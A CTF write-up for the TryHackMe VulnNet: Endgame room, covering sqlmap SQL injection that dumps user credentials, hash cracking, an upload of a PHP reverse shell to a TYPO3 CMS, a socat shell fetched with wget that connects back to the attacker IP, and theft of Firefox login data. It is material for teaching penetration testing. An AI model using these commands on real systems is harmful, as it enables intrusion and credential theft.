# VulnNet: Endgame

## Introduction

Welcome to my another writeup! In this TryHackMe [VulnNet: Endgame](https://tryhackme.com/room/vulnnetendgame) room, there are tons of stuff that's worth learning! Without further ado, let's dive in.

## Background

> Hack your way into this simulated vulnerable infrastructure. No puzzles. Enumeration is the key.

> Difficulty: Medium

- Overall difficulty for me: Hard
    - Initial foothold: Hard
    - Privilege escalation: Medium

```
VulnNet series is back with a new challenge.

It's the final challenge in this series, compromise the system. Enumeration is the key.


Deploy the vulnerable machine by clicking the "Start Machine" button. Access the system at http://MACHINE_IP and http://vulnnet.thm domain. Answer the task questions to complete the challenge.


You can contact me here:

- Discord: SkyWaves#1397

I don't reply during working hours.

Icon created by Freepik - Flaticon
```

# Service Enumeration

**Adding `vulnnet.thm` domain to `/etc/hosts`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
└─# echo "$RHOSTS vulnnet.thm" | tee -a /etc/hosts
```

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
└─# export RHOSTS=10.10.214.82
                                                                                                                         
┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bb:2e:e6:cc:79:f4:7d:68:2c:11:bc:4b:63:19:08:af (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQRQ5sGPZniwdg1TNW71UdA6dc2k3lpZ68EnacCUgKEqZT7sBvppGUJjSAMY7aZqdZJ0m5N9SQajB9iW3ZEKHM5qtbXOadbWkRKp3VrqtZ8VW1IthLa2+oLObY2r1qep6O2NqrghQ/yVCbJYF5H8BsTtjCVNBeVSzf9zetwUviO6xfqIRO3iM+8S2WpZwKGtrBFvA9RaBsqLBGB1XGUjufKxyRUzOx1J2I94Xhs/bDcaOV5Mw6xhSTxgS3q6xVmL6UU3hIbpiXzYcj2vxuAXXszyZCM4ZkxmQ1fddQawxHfmZRnqxVogoHDsOGgh9tpQsc+S/KTrYQa9oFEVARV70x
|   256 80:61:bf:8c:aa:d1:4d:44:68:15:45:33:ed:eb:82:a7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEg9Hw4CIelacGVS0U+uFcwEj183dT+WrY/tvJV4U8/1alrGM/8gIKHEQIsU4yGPtyQ6M8xL9q7ak6ze+YsHd2o=
|   256 87:86:04:e9:e0:c0:60:2a:ab:87:8e:9b:c7:05:35:1c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJJDCCks5eMviLJyDQY/oQ3LLgnDoXvqZS0AxNAJGv9T
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 2 ports are opened:

Ports Open        | Service
------------------|------------------------
22                | OpenSSH 7.6p1 Ubuntu
80                | Apache 2.4.29

## HTTP on Port 80

**http://10.10.214.82/:**
```
Our services are accessible only through the vulnnet.thm domain! 
```

**http://vulnnet.thm/:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-Endgame/images/a1.png)

Nothing interesting. Since we have a domain, let's **fuzz the subdomain** via `ffuf`:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
└─# ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://vulnnet.thm/ -H "Host: FUZZ.vulnnet.thm" -fw 9 
[...]
shop                    [Status: 200, Size: 26701, Words: 11619, Lines: 525, Duration: 240ms]
api                     [Status: 200, Size: 44, Words: 7, Lines: 1, Duration: 319ms]
blog                    [Status: 200, Size: 19316, Words: 1236, Lines: 391, Duration: 2879ms]
```

Found subdomains: `shop`, `api` and `blog`.

**Adding new subdomains to `/etc/hosts`:**
```
10.10.214.82 vulnnet.thm shop.vulnnet.thm api.vulnnet.thm blog.vulnnet.thm
```

**http://shop.vulnnet.thm/:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-Endgame/images/a2.png)

The `login` button is an **empty anchor**, which is a rabbit hole.

**http://blog.vulnnet.thm/:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-Endgame/images/a3.png)

In the `Author` page, we can find a user called `SkyWaves`, not sure is it useful.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-Endgame/images/a4.png)

Also, in the bottom of this page, it's saying this is a template:

```
Mediumish Theme by WowThemes.net
```

**http://vulnnet.thm/:**

By enumerating hidden directory via `gobuster`, I found a `README.txt` in `vulnnet.thm`:

**Gobuster:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
└─# gobuster dir -u http://vulnnet.thm/ -w /usr/share/wordlists/dirb/common.txt -t 100 -x php,html,txt,bak
[...]
/README.txt           (Status: 200) [Size: 743]
```

**http://vulnnet.thm/README.txt:**
```
TITLE: 
Soon - Responsive Free HTML5 Bootstrap Template

AUTHOR:
DESIGNED & DEVELOPED by FREEHTML5.co
[...]
```

Another template...

**http://api.vulnnet.thm/:**
```
VulnNet API is up!
```

In **http://api.vulnnet.thm/**, I found `index.php` is interesting.

**Gobuster:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
└─# gobuster dir -u http://api.vulnnet.thm/ -w /usr/share/wordlists/dirb/common.txt
[...]
/index.php            (Status: 200) [Size: 18] 
```

Maybe we can fuzzing it's GET parameter via `ffuf`?

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
└─# ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://api.vulnnet.thm/index.php?FUZZ=../../../../../../../etc/passwd" -fw 4
[...]
```

But nothing...

How about POST data?

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
└─# ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -X POST -d "FUZZ=../../../../../../../../etc/passwd" -u "http://api.vulnnet.thm/index.php" -fw 4
[...]
```

Again, nothing...

It's also weird that sometimes I send a GET request to `index.php`, and it shows this error message:

```
Connection failed: No such file or directory
```

I googled about this error message, and it appears to be MySQL. Maybe the API is trying to connect to the database via socket, and PHP can't find the socket file?

It seems like a deadend here. Let's **fuzz the subdomain again but with a bigger wordlist**.

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
└─# ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://vulnnet.thm/ -H "Host: FUZZ.vulnnet.thm" -timeout 30 -t 10 -fw 9
[...]
blog                    [Status: 200, Size: 19316, Words: 1236, Lines: 391, Duration: 408ms]
shop                    [Status: 200, Size: 26701, Words: 11619, Lines: 525, Duration: 260ms]
api                     [Status: 200, Size: 18, Words: 4, Lines: 1, Duration: 333ms]
admin1                  [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 18331ms]
```

Found new subdomain!!

**Add `admin1` subdomain to `/etc/hosts`:**
```
10.10.214.82 vulnnet.thm shop.vulnnet.thm api.vulnnet.thm blog.vulnnet.thm admin1.vulnnet.thm
```

**http://admin1.vulnnet.thm/en/:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-Endgame/images/a5.png)

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
└─# curl -vv http://admin1.vulnnet.thm                                                     
[...]
< HTTP/1.1 307 Temporary Redirect
[...]
< location: http://admin1.vulnnet.thm/en/
[...]
```

When I reach the webroot directory, it redirects me to `/en/`.

Let's enumerate hidden directory with `gobuster`:

**Gobuster:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
└─# gobuster dir -u http://admin1.vulnnet.thm/ -w /usr/share/wordlists/dirb/common.txt -t 10 --timeout 30s
[...]
/en                   (Status: 301) [Size: 321] [--> http://admin1.vulnnet.thm/en/]
/fileadmin            (Status: 301) [Size: 328] [--> http://admin1.vulnnet.thm/fileadmin/]
/server-status        (Status: 403) [Size: 283]                                           
/typo3conf            (Status: 301) [Size: 328] [--> http://admin1.vulnnet.thm/typo3conf/]
/typo3temp            (Status: 301) [Size: 328] [--> http://admin1.vulnnet.thm/typo3temp/]
/typo3                (Status: 301) [Size: 324] [--> http://admin1.vulnnet.thm/typo3/]    
/vendor               (Status: 301) [Size: 325] [--> http://admin1.vulnnet.thm/vendor/] 
```

Found Directories: `/fileadmin/`, `/typo3conf/`, `/typo3temp/`, `/typo3/`, `/vendor/`

**`/fileadmin/`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-Endgame/images/a6.png)

- `_temp_/`:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
└─# curl -vv http://admin1.vulnnet.thm/fileadmin/_temp_/
[...]
<!DOCTYPE html>
<html>
<head>
    <title></title>
    <meta http-equiv=Refresh Content="0; Url=/"/>
</head>
</html>
* Connection #0 to host admin1.vulnnet.thm left intact
```

It redirects me to the webroot directory (`/`).

- **`user_upload/`:**

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
└─# curl -vv http://admin1.vulnnet.thm/fileadmin/user_upload/
*   Trying 10.10.214.82:80...
* Connected to admin1.vulnnet.thm (10.10.214.82) port 80 (#0)
> GET /fileadmin/user_upload/ HTTP/1.1
> Host: admin1.vulnnet.thm
> User-Agent: curl/7.85.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Mon, 12 Sep 2022 03:26:46 GMT
< Server: Apache/2.4.29 (Ubuntu)
< Last-Modified: Tue, 14 Jun 2022 17:02:42 GMT
< ETag: "0-5e16b5f699eca"
< Accept-Ranges: bytes
< Content-Length: 0
< Content-Type: text/html
< 
* Connection #0 to host admin1.vulnnet.thm left intact
```

Nothing in `user_upload/`.

**`/typo3/`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-Endgame/images/a7.png)

Found a Content Management System (CMS) login page, which is `typo3`!

Let's continue our enumeration process!

**`/typo3temp/`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
└─# curl -vv http://admin1.vulnnet.thm/typo3temp/            
*   Trying 10.10.214.82:80...
* Connected to admin1.vulnnet.thm (10.10.214.82) port 80 (#0)
> GET /typo3temp/ HTTP/1.1
> Host: admin1.vulnnet.thm
> User-Agent: curl/7.85.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Mon, 12 Sep 2022 03:31:08 GMT
< Server: Apache/2.4.29 (Ubuntu)
< Last-Modified: Tue, 14 Jun 2022 17:10:27 GMT
< ETag: "0-5e16b7b277ce4"
< Accept-Ranges: bytes
< Content-Length: 0
< Content-Type: text/html
< 
* Connection #0 to host admin1.vulnnet.thm left intact
```

Nothing in `/typo3temp/`

**`/typo3conf/`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-Endgame/images/a8.png)

**`/vendor/`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-Endgame/images/a9.png)

Let's searching public exploits for `typo3` via `searchsploit`:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
└─# searchsploit typo3   
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
TYPO3 - Arbitrary File Retrieval                                                  | php/webapps/15856.php
Typo3 - File Disclosure                                                           | php/webapps/17905.txt
Typo3 3.5 b5 - 'showpic.php' File Enumeration                                     | php/webapps/22297.pl
Typo3 3.5 b5 - 'Translations.php' Remote File Inclusion                           | php/webapps/22298.txt
Typo3 3.5 b5 - HTML Hidden Form Field Information Disclosure (1)                  | php/webapps/22315.pl
Typo3 3.5 b5 - HTML Hidden Form Field Information Disclosure (2)                  | php/webapps/22316.pl
Typo3 3.7/3.8/4.0 - 'Class.TX_RTEHTMLArea_PI1.php' Multiple Remote Command Execut | php/webapps/29300.txt
Typo3 4.5 < 4.7 - Remote Code Execution / Local File Inclusion / Remote File Incl | php/webapps/18308.txt
TYPO3 < 4.0.12/4.1.10/4.2.6 - 'jumpUrl' Remote File Disclosure                    | php/webapps/8038.py
TYPO3 CMS 4.0 - 'showUid' SQL Injection                                           | php/webapps/9380.txt
Typo3 CMW_Linklist 1.4.1 Extension - SQL Injection                                | php/webapps/25186.txt
TYPO3 Extension Akronymmanager 0.5.0 - SQL Injection                              | php/webapps/37301.txt
Typo3 Extension JobControl 2.14.0 - Cross-Site Scripting / SQL Injection          | php/webapps/34800.txt
TYPO3 Extension ke DomPDF - Remote Code Execution                                 | php/webapps/35443.txt
TYPO3 Extension News - SQL Injection                                              | php/webapps/41940.py
TYPO3 Extension Restler 1.7.0 - Local File Disclosure                             | php/webapps/42985.txt
---------------------------------------------------------------------------------- ---------------------------------
```

But we couldn't find the `typo3` version of this machine...

Let's take a step back, and I was missing one critical thing.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-Endgame/images/a10.png)

When I send a **GET request to `blog.vulnnet.thm/post1.php`, it also uses an API to fetch a blog.**

**http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-Endgame/images/a11.png)

Hmm... Let's test for Local File Inclusion?

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-Endgame/images/a12.png)

Nope. 

How about **SQL injection**?

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
└─# sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" -p blog --dbs                             
[...]
[00:40:33] [INFO] GET parameter 'blog' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[00:40:40] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[...]
[00:43:35] [INFO] GET parameter 'blog' appears to be 'MySQL >= 5.0.12 OR time-based blind (SLEEP)' injectable
[...]
[00:44:02] [INFO] GET parameter 'blog' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'blog' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 79 HTTP(s) requests:
---
Parameter: blog (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: blog=1 AND 9729=9729

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (SLEEP)
    Payload: blog=1 OR SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: blog=-9075 UNION ALL SELECT CONCAT(0x7176717671,0x72576a667762514c4a48736172554a6d677548546a724163455949526b53546f6153495564735376,0x71766a6b71),NULL,NULL-- -
---
[00:44:24] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[00:44:41] [INFO] fetching database names
available databases [3]:
[*] blog
[*] information_schema
[*] vn_admin
```

**It's vulnerable to SQL injection!**

Let's enumerate the entire MySQL's databases!

The database `vn_admin` sounds holding some credentials in the `typo3` CMS!

**Enumerate database `vn_admin`'s table names:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
└─# sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" -p blog --dbms=mysql -D vn_admin --tables
[...]
Database: vn_admin
[48 tables]
+---------------------------------------------+
| backend_layout                              |
| be_dashboards                               |
| be_groups                                   |
| be_sessions                                 |
| be_users                                    |
| cache_adminpanel_requestcache               |
| cache_adminpanel_requestcache_tags          |
| cache_hash                                  |
| cache_hash_tags                             |
| cache_imagesizes                            |
| cache_imagesizes_tags                       |
| cache_pages                                 |
| cache_pages_tags                            |
| cache_pagesection                           |
| cache_pagesection_tags                      |
| cache_rootline                              |
| cache_rootline_tags                         |
| cache_treelist                              |
| fe_groups                                   |
| fe_sessions                                 |
| fe_users                                    |
[...]
```

Table `be_users` looks like is: `backend_users`, **which holds administrator credentials**!

**Enumerate database `vn_admin` table `be_users`'s column names:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
└─# sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" -p blog --dbms=mysql -D vn_admin -T be_users --columns
[...]
Database: vn_admin
Table: be_users
[34 columns]
+-----------------------+----------------------+
| Column                | Type                 |
+-----------------------+----------------------+
| admin                 | smallint(5) unsigned |
| allowed_languages     | varchar(255)         |
| avatar                | int(10) unsigned     |
| category_perms        | text                 |
| crdate                | int(10) unsigned     |
| createdByAction       | int(11)              |
| cruser_id             | int(10) unsigned     |
| db_mountpoints        | text                 |
| deleted               | smallint(5) unsigned |
| description           | text                 |
| disable               | smallint(5) unsigned |
| disableIPlock         | smallint(5) unsigned |
| email                 | varchar(255)         |
| endtime               | int(10) unsigned     |
| file_mountpoints      | text                 |
| file_permissions      | text                 |
| lang                  | varchar(6)           |
| lastlogin             | int(10) unsigned     |
| lockToDomain          | varchar(50)          |
| options               | smallint(5) unsigned |
| password              | varchar(100)         |
| pid                   | int(10) unsigned     |
| realName              | varchar(80)          |
| starttime             | int(10) unsigned     |
| TSconfig              | text                 |
| tstamp                | int(10) unsigned     |
| uc                    | mediumblob           |
| uid                   | int(10) unsigned     |
| usergroup             | varchar(255)         |
| usergroup_cached_list | text                 |
| userMods              | text                 |
| username              | varchar(50)          |
| workspace_id          | int(11)              |
| workspace_perms       | smallint(6)          |
+-----------------------+----------------------+
```

**Let's extract username and password column!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
└─# sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" -p blog --dbms=mysql -D vn_admin -T be_users -C username,password
[...]
[00:59:53] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/api.vulnnet.thm'
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
└─# cat /root/.local/share/sqlmap/output/api.vulnnet.thm/dump/vn_admin/be_users.csv
username,password
chris_w,"$argon2i$v=19$m=65536,t=16,p=2${Redacted}"

┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
└─# cat chris_w.hash                                                               
$argon2i$v=19$m=65536,t=16,p=2${Redacted}
```

Hmm... Argon2 hash. I tried to crack it via `john` with `rockyou` wordlist, but no dice.

Let's enumerate database `blog` then.

**Enumerate database `blog`'s table names:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
└─# sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" -p blog --dbms=mysql -D blog --tables
[...]
Database: blog
[4 tables]
+------------+
| blog_posts |
| details    |
| metadata   |
| users      |
+------------+
```

Table `users`? That's odd.

**Enumerate database `blog` table `users`'s column names:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
└─# sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" -p blog --dbms=mysql -D blog -T users --columns
[...]
Database: blog
Table: users
[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int(11)     |
| password | varchar(50) |
| username | varchar(50) |
+----------+-------------+
```

**Extract `username` and `password` data:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
└─# sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" -p blog --dbms=mysql -D blog -T users -C username,password --dump
[...]
+--------------------+---------------------+
| username           | password            |
+--------------------+---------------------+
| lspikinsaz         | D8Gbl8mnxg          |
| profeb0            | kLLxorKfd           |
| sberrymanb1        | cdXAJAR             |
| ajefferiesb2       | 0hdeFiZBRJ          |
| hkibblewhiteb3     | 6rl6qXSJDrr         |
| dtremayneb4        | DuYMuI              |
| bflewinb5          | fwbk0Vgo            |
| kmolineuxb6        | 92Fb3vBF5k75        |
| fjosefsb7          | zzh9wheBjX          |
| tmiskellyb8        | sAGTlyBrb5r         |
| nallrightb9        | 3uUPdL              |
| hlevermoreba       | fp2LW0x             |
| celgerbb           | IKhg7D              |
| frustedbc          | Tjyu2Ch2            |
| imeneghibd         | NgKgdeKRVEK         |
| vgouninbe          | wGWMg3d             |
| cbartoschbf        | ruTxBc2n85          |
| lcordonbg          | ZydELwZFV2          |
| dappsbh            | ROfVmvZSYS          |
| zduchanbi          | B4SBGt5yAD          |
| jfraybj            | zhE95JJX9l          |
| mlanchesterbk      | nXSVHhVW9S          |
| cgylesbl           | NCeU070             |
| cbonnifacebm       | WzkvfoedkXJx        |
| btoppasbn          | ktPBpK1             |
| mdurrettbo         | 8fCXE6BF9gj         |
| skilroybp          | cSAjOy              |
| uvonderemptenbq    | HLUHZ9oQ            |
| dvinsenbr          | gTc7TiSsd2          |
| ltiltbs            | 7yQ0b1B             |
| dsimcoebt          | SXD1eC6ysa          |
| wfrailbu           | bgb084kq            |
[...]
[01:15:43] [INFO] table 'blog.users' dumped to CSV file '/root/.local/share/sqlmap/output/api.vulnnet.thm/dump/blog/users.csv'
```

That's a LOT of users and passwords!

Hmm... Let's take the `password` column's data as the **password wordlist** for the user `chris_w`? We can clean that up via `cut`.

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
└─# cat /root/.local/share/sqlmap/output/api.vulnnet.thm/dump/blog/users.csv | cut -d "," -f2 > passlist.txt

┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
└─# cat passlist.txt 
password
d5aa4AsdO
HCeByMT
YffkBZ
ZJpyxy
c7I4LAkVMIEN
75mupA
1hoUq2Q
TB5ziSGLU3
BdZ1sipbGkR7
[...]
```

Time to crack `chris_w`'s hash!

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
└─# john --wordlist=passlist.txt chris_w.hash 
[...]
{Redacted}      (?)
```

Found it!!!

# Initial Foothold

Let's login to the `typo3` CMS backend login page!

**http://admin1.vulnnet.thm/typo3/:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-Endgame/images/a13.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-Endgame/images/a14.png)

We're in!

By enumerating the `typo3` CMS backend page manaully, **we can upload a PHP reverse shell**.

To do so, I'll:

- Allow all file extensions to be uploaded:

**Go to "Settings" -> "Configure Installation-Wide Options" -> "\[BE\]\[fileDenyPattern\]":**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-Endgame/images/a15.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-Endgame/images/a16.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-Endgame/images/a17.png)

**Delete all filter, then click "Write configuration" to apply changes:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-Endgame/images/a18.png)

- Upload a PHP reverse shell: (From [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php))

**Copy a PHP reverse shell:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
└─# cp /usr/share/webshells/php/php-reverse-shell.php ./revshell.php
                                                                                                                         
┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
└─# nano revshell.php           
```

**Go to "Filelist" to upload it:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-Endgame/images/a19.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-Endgame/images/a20.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-Endgame/images/a21.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-Endgame/images/a22.png)

Now the PHP reverse shell has been **uploaded to `admin1.vulnnet.thm/fileadmin/user_upload/revshell.php`.**

- Setup a `nc` listener, and trigger the reverse shell:

**Setup a `nc` listener:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
└─# nc -lnvp 443     
listening on [any] 443 ...
```

**Trigger the reverse shell:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Vulnnet-Endgame]
└─# curl http://admin1.vulnnet.thm/fileadmin/user_upload/revshell.php
```

**Received reverse shell connection:**
```
[...]                        
listening on [any] 443 ...
connect to [10.18.61.134] from (UNKNOWN) [10.10.214.82] 51938
Linux vulnnet-endgame 5.4.0-120-generic #136~18.04.1-Ubuntu SMP Fri Jun 10 18:00:44 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 21:29:56 up 15 min,  0 users,  load average: 0.01, 0.08, 0.13
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@vulnnet-endgame:/var/www/html/admin1/fileadmin/user_upload$ 
```

I'm `www-data`!

**Let's stable our reverse shell via `socat`**, so we won't accidentally exit it when we press `Ctrl+C`.

**Stable shell via `socat`:**
```
┌──(root🌸siunam)-[/opt/static-binaries/binaries/linux/x86_64]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444
[...]
```

```
www-data@vulnnet-endgame:/var/www/html/admin1/fileadmin/user_upload$ wget http://10.18.61.134/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.18.61.134:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444
[...]
www-data@vulnnet-endgame:/tmp$ stty rows 22 columns 121
www-data@vulnnet-endgame:/tmp$ export TERM=xterm-256color
```

# Privilege Escalation

## www-data to system

**Found user `system`:**
```
www-data@vulnnet-endgame:/tmp$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
system:x:1000:1000:system,,,:/home/system:/bin/bash
```

**Found MySQL credentials in /var/www/admin1/typo3conf/LocalConfiguration.php:**
```php
'dbname' => 'vn_admin',
'driver' => 'mysqli',
'host' => '127.0.0.1',
'password' => 'q2SbGTnSSWB95',
```

I tried password reuse for the user `system`, but no dice.

**Found another MySQL credentials in /var/www/api/index.php:**
```php
$servername = "localhost";
$username = "dbadmin";
$password = "q2SbGTnSSWB95";
```

Again. tried password reuse for use `system`, but no luck.

**Found another MySQL credentials again in /var/www/html/typo3-2/typo3conf/LocalConfiguration.php:**
```php
'dbname' => 'typo33',
'driver' => 'mysqli',
'host' => '127.0.0.1',
'password' => 'SuperSecret321',
```

Again, failed for password reuse.

In user `system`'s home directory, there is a `.mozilla` directory, **which holds firefox's history of it's user**:

```
www-data@vulnnet-endgame:/home/system$ ls -lah
[..]
drwxr-xr-x  4 system system 4.0K Jun 14 11:56 .mozilla
```

Let's `zip` the entire `.mozilla` and transfer it to the atttacker machine:

```
www-data@vulnnet-endgame:/home/system$ zip -r /tmp/browser.rar /home/system/.mozilla/

www-data@vulnnet-endgame:/home/system$ cd /tmp
www-data@vulnnet-endgame:/tmp$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

┌──(root🌸siunam)-[~/ctf/thm/ctf/Vulnnet-Endgame]
└─# wget http://$RHOSTS:8000/browser.rar

┌──(root🌸siunam)-[~/ctf/thm/ctf/Vulnnet-Endgame]
└─# unzip browser.rar
```

```
┌──(root🌸siunam)-[~/…/home/system/.mozilla/firefox]
└─# ls -lah               
total 36K
drwxr-xr-x  7 root root 4.0K Jun 14 13:21  .
drwxr-xr-x  4 root root 4.0K Jun 14 11:56  ..
drwxr-xr-x 13 root root 4.0K Jun 14 10:43  2fjnrwth.default-release
drwxr-xr-x  2 root root 4.0K Jun 14 11:56  2o9vd4oi.default
drwxr-xr-x 13 root root 4.0K Jun 14 13:37  8mk7ix79.default-release
drwxr-xr-x  3 root root 4.0K Jun 14 11:56 'Crash Reports'
-rwxr-xr-x  1 root root   62 Jun 14 11:56  installs.ini
drwxr-xr-x  2 root root 4.0K Jun 14 11:56 'Pending Pings'
-rwxr-xr-x  1 root root  259 Jun 14 11:56  profiles.ini
```

Let's look at one of the directories:

```
┌──(root🌸siunam)-[~/…/system/.mozilla/firefox/2fjnrwth.default-release]
└─# ls -lah 
[...]
-rwxr-xr-x  1 root root  658 Jun 14 10:43 logins.json
[...]
```

